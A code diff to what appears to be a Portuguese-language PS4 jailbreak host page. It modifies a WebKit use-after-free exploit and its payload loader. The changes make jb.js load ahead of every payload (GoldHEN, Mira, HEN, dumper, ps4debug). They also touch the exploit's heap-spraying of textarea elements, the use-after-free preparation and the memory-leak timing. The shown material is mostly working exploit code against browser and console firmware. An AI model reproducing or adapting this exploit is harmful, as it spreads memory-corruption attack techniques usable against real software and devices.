@@ -34,6 +34,8 @@ var g_jsview_butterfly = null;
 var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
+var g_textarea_div_elem = null;
+
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -124,60 +126,54 @@ function setupRW() {
 }
 
 function toggle_payload(pld){
-	if(pld == "exploit"){
-		document.getElementById("progress").innerHTML="Executando o Jailbreak (NOVO)... Por favor, AGUARDE!!!";
-		preloadScripts(['jb.js']);
-	}else if(pld == "exploit_old"){
-		document.getElementById("progress").innerHTML="Executando o Jailbreak (ANTIGO)... Por favor, AGUARDE!!!";
-		preloadScripts(['oldjb.js']);
-	}else if(pld == "binloader"){
+	if(pld == "binloader"){
 		document.getElementById("progress").innerHTML="Aguardando a CARGA ÚTIL... Envie pela porta 9020.";
-		preloadScripts(['preloader.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'loader.js']);
 	}else if(pld == "mira"){
 		document.getElementById("progress").innerHTML="Carregando MIRA.. Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'mira.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'mira.js', 'loader.js']);
 	}else if(pld == "mira2"){
 		document.getElementById("progress").innerHTML="Carregando MIRA + SPOOF... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'mira2.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'mira2.js', 'loader.js']);
 	}else if(pld == "hen213b"){
 		document.getElementById("progress").innerHTML="Carregando Hen v2.1.3b... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'hen213b.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'hen213b.js', 'loader.js']);
 	}else if(pld == "goldhen"){
 		document.getElementById("progress").innerHTML="Carregando GoldHen v1.0... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'goldhen.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'goldhen.js', 'loader.js']);
 	}else if(pld == "goldhen2"){
 		document.getElementById("progress").innerHTML="Carregando GoldHen v1.13b... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'goldhen2.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'goldhen2.js', 'loader.js']);
 	}else if(pld == "dumper"){
 		document.getElementById("progress").innerHTML="Carregando Carga Útil... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'dumper.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'dumper.js', 'loader.js']);
 	}else if(pld == "backup"){
 		document.getElementById("progress").innerHTML="Carregando Carga Útil (backup)... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'backup.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'backup.js', 'loader.js']);
 	}else if(pld == "restore"){
 		document.getElementById("progress").innerHTML="Carregando Carga Útil (restore)... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'restore.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'restore.js', 'loader.js']);
 	}else if(pld == "app2usb"){
 		document.getElementById("progress").innerHTML="Carregando o app2USB... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'app2usb.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'app2usb.js', 'loader.js']);
 	}else if(pld == "webrte"){
 		document.getElementById("progress").innerHTML="Carregando o WebRTE... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'webrte.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'webrte.js', 'loader.js']);
 	}else if(pld == "ps4debug"){
 		document.getElementById("progress").innerHTML="Carregando o PS4Debug... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'ps4debug.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'ps4debug.js', 'loader.js']);
 	}else if(pld == "todex"){
 		document.getElementById("progress").innerHTML="Carregando o ToDex... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'todex.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'todex.js', 'loader.js']);
 	}else if(pld == "fancontrol"){
 		document.getElementById("progress").innerHTML="Enviando temperatura alvo... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'fancontrol.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'fancontrol.js', 'loader.js']);
 	}else if(pld == "payload"){
 		document.getElementById("progress").innerHTML="Abrindo página de ativação(ões)... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'payload.js', 'loader.js', 'frontend.js']);
+		preloadScripts(['jb.js','preloader.js', 'payload.js', 'loader.js', 'frontend.js']);
 	}else if(pld == "guia"){
 		document.getElementById("progress").innerHTML="Carregando o host para o guia do usuário... Por favor, AGUARDE!!!";
-		preloadScripts(['preloader.js', 'guia.js', 'loader.js']);
+		preloadScripts(['jb.js','preloader.js', 'guia.js', 'loader.js']);
 	}
 	if(window.postPayload)
 		window.postPayload();
@@ -380,7 +376,7 @@ function confuseTargetObjRound1() {
 	 * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
 	 * the next 5s
 	 */
-	setTimeout(function(){leakJSC();}, 6000);
+	setTimeout(leakJSC, 6000);
 }
 
 function handle2() {
@@ -485,7 +481,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
 	debug_log("[+] Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = window.xyu = document.createElement("div");
+	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
